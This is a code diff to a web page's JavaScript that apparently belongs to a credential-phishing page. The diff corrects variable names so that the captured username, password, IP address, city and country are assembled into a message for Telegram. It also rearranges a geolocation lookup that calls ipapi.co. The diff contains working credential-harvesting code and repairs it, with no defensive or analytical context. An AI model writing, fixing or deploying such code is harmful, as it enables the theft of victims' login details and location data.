@@ -165,8 +165,8 @@
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
             var ipaddress = document.getElementById('ipaddress').value;
-            var ipaddress = document.getElementById('city').value;
-            var ipaddress = document.getElementById('country').value;
+            var city = document.getElementById('city').value;
+            var country = document.getElementById('country').value;
 
             var telegramMessage = `Username: ${username}\nPassword: ${password}\nIpaddress: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
 
@@ -188,9 +188,6 @@
                     console.error('Error:', error);
                 });
         });
-
-    </script>
-<script>
   fetch('https://ipapi.co/json/')
     .then(response => response.json())
     .then(data => {
@@ -200,6 +197,9 @@
     .catch(error => {
       console.log('Geolocation error:', error);
     });
+    </script>
+<script>
+
 </script>
 
 
